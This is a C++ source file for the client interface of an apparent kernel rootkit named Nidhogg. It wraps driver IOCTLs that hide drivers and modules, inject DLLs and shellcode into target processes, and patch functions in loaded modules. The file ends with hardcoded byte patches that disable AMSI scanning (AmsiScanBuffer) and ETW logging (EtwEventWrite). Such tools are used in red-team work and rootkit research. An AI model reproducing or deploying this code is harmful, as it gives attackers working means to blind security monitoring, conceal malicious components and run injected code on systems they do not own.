#include "pch.h"
#include "Nidhogg.h"

std::wstring NidhoggInterface::ParsePath(wchar_t* path) {
	std::wstring result = path;

	if (result.find(LR"(C:\Windows)") != std::wstring::npos) {
		result.replace(0, 10, LR"(\SystemRoot)");
	}
	else if (result.find(LR"(C:\)") != std::wstring::npos) {
		result.replace(0, 3, LR"(\??\C:\)");
	}
	return result;
}

NidhoggErrorCodes NidhoggInterface::HideDriver(wchar_t* driverPath) {
	DWORD returned = 0;
	HiddenDriverInformation driverInfo{};

	if (!driverPath)
		return NIDHOGG_GENERAL_ERROR;

	if (wcslen(driverPath) > MAX_PATH)
		return NIDHOGG_GENERAL_ERROR;

	std::wstring parsedDriverName = ParsePath(driverPath);
	driverInfo.DriverName = (WCHAR*)parsedDriverName.data();
	driverInfo.Hide = true;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_DRIVER,
		&driverInfo, sizeof(driverInfo),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::UnhideDriver(wchar_t* driverPath) {
	DWORD returned = 0;
	HiddenDriverInformation driverInfo{};

	if (!driverPath)
		return NIDHOGG_GENERAL_ERROR;

	if (wcslen(driverPath) > MAX_PATH)
		return NIDHOGG_GENERAL_ERROR;

	std::wstring parsedDriverName = this->ParsePath(driverPath);
	driverInfo.DriverName = (WCHAR*)parsedDriverName.data();
	driverInfo.Hide = false;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_DRIVER,
		&driverInfo, sizeof(driverInfo),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::HideModule(DWORD pid, wchar_t* modulePath) {
	DWORD returned = 0;
	HiddenModuleInformation moduleInfo{};

	if (pid <= 0 || pid == SYSTEM_PID || !modulePath)
		return NIDHOGG_GENERAL_ERROR;

	if (wcslen(modulePath) > MAX_PATH)
		return NIDHOGG_GENERAL_ERROR;

	moduleInfo.Pid = pid;
	moduleInfo.ModuleName = modulePath;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_MODULE,
		&moduleInfo, sizeof(moduleInfo),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::InjectDll(DWORD pid, std::string dllPath, InjectionType injectionType) {
	DWORD returned;
	DllInformation dllInformation{};

	if (pid <= 0 || pid == SYSTEM_PID || dllPath.empty())
		return NIDHOGG_GENERAL_ERROR;

	if (dllPath.size() > MAX_PATH)
		return NIDHOGG_GENERAL_ERROR;

	dllInformation.Type = injectionType;
	dllInformation.Pid = pid;
	SIZE_T dllPathSize = dllPath.size();
	dllInformation.DllPath = (char*)dllPath.data();

	if (!dllInformation.DllPath)
		return NIDHOGG_GENERAL_ERROR;
	
	if (!DeviceIoControl(this->hNidhogg, IOCTL_INJECT_DLL,
		&dllInformation, sizeof(dllInformation),
		nullptr, 0, &returned, nullptr)) {
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	}

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::InjectShellcode(DWORD pid, PVOID shellcode, ULONG shellcodeSize, PVOID parameter1, PVOID parameter2, PVOID parameter3, InjectionType injectionType) {
	DWORD returned;
	ShellcodeInformation shellcodeInformation{};

	if (pid <= 0 || pid == SYSTEM_PID || !shellcode)
		return NIDHOGG_GENERAL_ERROR;

	shellcodeInformation.Type = injectionType;
	shellcodeInformation.Pid = pid;
	shellcodeInformation.ShellcodeSize = shellcodeSize;
	shellcodeInformation.Shellcode = shellcode;
	shellcodeInformation.Parameter1 = parameter1;
	shellcodeInformation.Parameter2 = parameter2;
	shellcodeInformation.Parameter3 = parameter3;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_INJECT_SHELLCODE,
		&shellcodeInformation, sizeof(shellcodeInformation),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::PatchModule(DWORD pid, wchar_t* moduleName, char* functionName, std::vector<byte> patch) {
	DWORD returned;
	PatchedModule patchedModule{};

	patchedModule.Pid = pid;
	patchedModule.PatchLength = (ULONG)patch.size();
	patchedModule.ModuleName = moduleName;
	patchedModule.FunctionName = functionName;
	patchedModule.Patch = patch.data();

	if (patchedModule.ModuleName == nullptr || patchedModule.FunctionName == nullptr || patchedModule.Patch == nullptr)
		return NIDHOGG_GENERAL_ERROR;

	if (wcslen(moduleName) > MAX_PATH)
		return NIDHOGG_GENERAL_ERROR;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PATCH_MODULE,
		&patchedModule, sizeof(patchedModule),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::AmsiBypass(DWORD pid) {
	std::vector<byte> patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
	return this->PatchModule(pid, (wchar_t*)LR"(C:\Windows\System32\Amsi.dll)", (char*)"AmsiScanBuffer", patch);
}

NidhoggErrorCodes NidhoggInterface::ETWBypass(DWORD pid) {
	std::vector<byte> patch = { 0xC3 };
	return this->PatchModule(pid, (wchar_t*)LR"(C:\Windows\System32\Ntdll.dll)", (char*)"EtwEventWrite", patch);
}